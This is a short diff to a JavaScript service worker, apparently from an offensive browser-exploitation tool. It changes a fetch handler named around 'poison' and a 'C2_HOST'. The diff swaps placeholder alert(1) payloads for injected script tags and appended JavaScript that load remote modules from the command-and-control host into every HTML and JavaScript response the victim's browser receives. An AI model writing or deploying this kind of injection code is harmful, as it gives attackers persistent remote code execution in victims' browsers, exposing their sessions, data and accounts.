@@ -124,6 +124,9 @@ self.addEventListener('sync', function(event){
 self.addEventListener('fetch', function(event){
   event.respondWith(
     fetch(event.request).then(function(response){
+      if(event.request.url.indexOf(C2_HOST) >= 0){
+        return response;
+      }
       var init = {
         status:     response.status,
         statusText: response.statusText,
@@ -133,11 +136,12 @@ self.addEventListener('fetch', function(event){
         init.headers[k] = v;
       });
       var poison = "";
+      var dom_modules = `${C2_HOST}/modules/dom`;
       if(response.headers['content-type'].indexOf('text/html') >= 0){
-        poison = "<script>alert(1)</script>";
+        poison = `<script src="${dom_modules}"></script>`;
       }
       if(response.headers['content-type'].indexOf('application/javascript') >= 0){
-        poison = ";alert(1)";
+        poison = `;var _sw_dom_=document.createElement('script');_sw_dom_.setAttribute('src','${dom_modules}');document.head.appendChild(_sw_dom_);`;
       }
       return response.text().then(function(body){
         if(body.indexOf("C2_SERVER") >= 0){ // part of SW
